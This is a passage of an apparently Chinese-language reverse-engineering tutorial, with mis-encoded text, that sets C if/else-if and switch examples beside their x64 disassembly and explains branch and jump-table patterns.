·æ—¶ï¼Œå¯è§†ä¸ºä¸€ä¸ª å¤šåˆ†æ”¯ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nVar_4 = <span class="hljs-number">5</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nVar_4);<br><br>  <span class="hljs-comment">// argc == 0 ? 0 : -1</span><br>  <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 0\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">1</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 1\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">2</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 2\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;argc == 3\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;else\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> nVar_4;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„åæ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span>   <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h  <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">5</span>   <span class="hljs-comment">//var_a=5</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]  <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 cmp     [rbp+arg_0], <span class="hljs-number">0</span>  <span class="hljs-comment">//argc -0  //if (var_a==0)&#123; pintf(&quot;argc == 0\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jnz     <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;argc == 0\r&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015DA  <span class="hljs-comment">//ç›´æ¥ç»“æŸ</span><br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span>  <span class="hljs-comment">//è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥æ— æ¡ä»¶è·³è½¬åˆ°è¿™é‡Œ ç»“æŸæŒ‡å‘åŒä¸€ä¸ª åœ°å€loc_4015DA ç”±äºloc_4015BEåæ‰æ˜¯ç»Ÿä¸€ç»“æŸåˆ¤æ–­åœ°å€ å› ä¸º é‚£é‡Œæ˜¯å¯¹åº”çš„elseè¯­å¥ å› æ­¤å¯ä»¥åˆ¤æ–­ä½¿ç”¨äº† ifelifè¯­å¥ç»“æ„</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">32</span>â†‘j  <span class="hljs-comment">//if</span><br>.text:<span class="hljs-number">0000000000401592</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span>  <span class="hljs-comment">//elif (var_a==1)&#123; pintf(&quot;argc == 1\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401596</span>                 jnz     <span class="hljs-keyword">short</span> h<br>.text:<span class="hljs-number">0000000000401598</span>                 lea     rcx, aArgc1     ; <span class="hljs-string">&quot;argc == 1\r&quot;</span><br>.text:<span class="hljs-number">000000000040159F</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>A4                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>A6 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A6<br>.text:<span class="hljs-number">00000000004015</span>A6 loc_4015A6:                             ; CODE XREF: main+<span class="hljs-number">46</span>â†‘j <span class="hljs-comment">//elif (var_a==2)&#123; pintf(&quot;argc == 2\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 jnz     <span class="hljs-keyword">short</span> loc_4015BA<br>.text:<span class="hljs-number">00000000004015</span>AC                 lea     rcx, aArgc2     ; <span class="hljs-string">&quot;argc == 2\r&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>3                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015B</span>8                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015B</span>A ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015B</span>A<br>.text:<span class="hljs-number">00000000004015B</span>A loc_4015BA:                             ; CODE XREF: main+<span class="hljs-number">5</span>Aâ†‘j <span class="hljs-comment">//elif (var_a==3)&#123; pintf(&quot;argc == 3\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015B</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004015B</span>E                 jnz     <span class="hljs-keyword">short</span> loc_4015CE<br>.text:<span class="hljs-number">00000000004015</span>C0                 lea     rcx, aArgc3     ; <span class="hljs-string">&quot;argc == 3\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>C7                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>CC                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>CE ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>CE<br>.text:<span class="hljs-number">00000000004015</span>CE loc_4015CE:                             ; CODE XREF: main+<span class="hljs-number">6</span>Eâ†‘j<br>.text:<span class="hljs-number">00000000004015</span>CE                 lea     rcx, aElse      ; <span class="hljs-string">&quot;else\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>D5                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>DA<br>.text:<span class="hljs-number">00000000004015</span>DA loc_4015DA:                             ; CODE XREF: main+<span class="hljs-number">40</span>â†‘j<br>.text:<span class="hljs-number">00000000004015</span>DA                                         ; main+<span class="hljs-number">54</span>â†‘j ...<br>.text:<span class="hljs-number">00000000004015</span>DA                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015E1</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015E6</span>                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>ED                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>2                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015F</span>9                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>E                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401605</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040160</span>A                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401611</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401616</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401619</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">000000000040161</span>D                 pop     rbp<br>.text:<span class="hljs-number">000000000040161</span>E                 retn<br>.text:<span class="hljs-number">000000000040161</span>E main            endp<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>ç‰¹ç‚¹ï¼š</p><p>â€‹    ç‰¹ç‚¹1: // æ³¨æ„ï¼Œå’Œelseifä¸åŒï¼Œå†…å®¹ä¸­æ²¡æœ‰breakçš„è¯ï¼Œç¼–è¯‘ä¸ä¼šè‡ªåŠ¨åŠ å…¥breakï¼ˆå°±æ˜¯jmp ç»“å°¾ï¼‰ </p><p>â€‹    ç‰¹ç‚¹2: // å†…å®¹è¿ç€å†™ï¼Œè¿™æ˜¯ä¸ºäº†ç¬¦åˆCè¯­è¨€çš„è¯­æ³•ï¼šcaseä¸­ä¸å†™breakï¼Œä¼šé¡ºç€æ‰§è¡Œä¸‹ä¸€æ¡case</p><p>â€‹    ç‰¹ç‚¹3:// è·³è½¬è¡¨æ˜¯ä»0å¼€å§‹çš„ï¼Œå› æ­¤è®°å½•æœ€å°å€¼ï¼Œswitchçš„åˆ¤æ–­ä¸­ä¼šè®©å…ƒç´ å‡å»æœ€å°å€¼ï¼Œå†æŸ¥è¡¨ã€‚å‡å»æœ€å°å€¼çš„å¥½å¤„ï¼šå¦‚æœè¾“å…¥å°äºæœ€å°å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªè¾“å…¥å†å‡å»æœ€å°å€¼å°±ä¼šå˜æˆè´Ÿæ•°ï¼Œ è€Œæ¯”è¾ƒæ—¶ä½¿ç”¨jaï¼Œä¹Ÿå°±æ˜¯ç”¨æ— ç¬¦å·æ•°åˆ¤æ–­ï¼Œé‚£ä¹ˆè¿™ä¸ªè´Ÿæ•°å°±ä¼šå˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼ŒåŒæ ·ä¼šè·³è½¬</p><h4 id="ezswitchå°äº3"><a href="#ezswitchå°äº3" class="headerlink" title="ezswitchå°äº3"></a>ezswitchå°äº3</h4><p>switch</p><p>å½“caseæƒ…å†µå°äºç­‰äº3æ—¶ï¼Œifelseå’Œswitchå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(argc)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 0\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 1\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 2\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HelloWorld\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”åæ±‡ç¼–</p><p>//ä¸‹é¢è¿™é‡Œç¼–è¾‘å™¨åšäº†ä¼˜åŒ– å‡å°‘äº†ä¸€æ¬¡è·³è½¬ 0 1 2  =&gt; 1 2 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000401568</span>                 jz      <span class="hljs-keyword">short</span> loc_401584<br>.text:<span class="hljs-number">000000000040156</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000040156</span>E                 jz      <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401570</span>                 cmp     [rbp+arg_0], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401574</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401576</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;case 0&quot;</span><br>.text:<span class="hljs-number">000000000040157</span>D                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401584</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401584</span><br>.text:<span class="hljs-number">0000000000401584</span> loc_401584:                             ; CODE XREF: main+<span class="hljs-number">18</span>â†‘j<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, aCase1     ; <span class="hljs-string">&quot;case 1&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">1</span>Eâ†‘j<br>.text:<span class="hljs-number">0000000000401592</span>                 lea     rcx, aCase2     ; <span class="hljs-string">&quot;case 2&quot;</span><br>.text:<span class="hljs-number">0000000000401599</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040159</span>E                 nop<br>.text:<span class="hljs-number">000000000040159F</span><br>.text:<span class="hljs-number">000000000040159F</span> loc_40159F:                             ; CODE XREF: main+<span class="hljs-number">24</span>â†‘j<br>.text:<span class="hljs-number">000000000040159F</span>                                         ; main+<span class="hljs-number">32</span>â†‘j ...<br>.text:<span class="hljs-number">000000000040159F</span>                 lea     rcx, aHelloworld ; <span class="hljs-string">&quot;HelloWorld&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015B</span>0                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>4                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>5                 retn<br>.text:<span class="hljs-number">00000000004015B</span>5 main            endp<br></code></pre></td></tr></table></figure><h4 id="switch-åˆ†æ”¯å¤§äº4"><a href="#switch-åˆ†æ”¯å¤§äº4" class="headerlink" title="switch åˆ†æ”¯å¤§äº4"></a>switch åˆ†æ”¯å¤§äº4</h4><p>æ³¨æ„switchåˆ†æ”¯å¤§äº4ä¹‹åå°±æœ‰è·³è½¬è¡¨</p><p>è¯¦è§£åœ¨switch7é‚£é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    myFunction(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„åæ±‡ç¼–ä»£ç   (è¿™é‡Œä»…æ”¾functionçš„éƒ¨åˆ†)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"> myFunction      proc near               ; CODE XREF: main+<span class="hljs-number">12</span>â†“p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h   <span class="hljs-comment">//ä¼ å…¥å‚æ•°</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp  <br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h                 <span class="hljs-comment">//å¼€è¾Ÿç©ºé—´ </span><br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx  <span class="hljs-comment">//æŠŠ ä¼ å…¥çš„å‚æ•° ç»™ å‡½æ•°ä½“å†…çš„å±€éƒ¨å˜é‡ </span><br>.text:<span class="hljs-number">000000000040155B</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>   <span class="hljs-comment">// if(x==2)</span><br>.text:<span class="hljs-number">000000000040155F</span>                 jz      <span class="hljs-keyword">short</span> loc_401589<br>.text:<span class="hljs-number">0000000000401561</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>  <span class="hljs-comment">//if(x&gt;2)</span><br>.text:<span class="hljs-number">0000000000401565</span>                 jg      <span class="hljs-keyword">short</span> loc_40156F<br>.text:<span class="hljs-number">0000000000401567</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span> <span class="hljs-comment">//if(x==1)</span><br>.text:<span class="hljs-number">000000000040156B</span>                 jz      <span class="hljs-keyword">short</span> loc_40157D  <br>.text:<span class="hljs-number">000000000040156</span>D                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040156F</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040156F</span><br>.text:<span class="hljs-number">000000000040156F</span> loc_40156F:                             ; CODE XREF: myFunction+<span class="hljs-number">15</span>â†‘j<br>.text:<span class="hljs-number">000000000040156F</span>                 cmp     [rbp+arg_0], <span 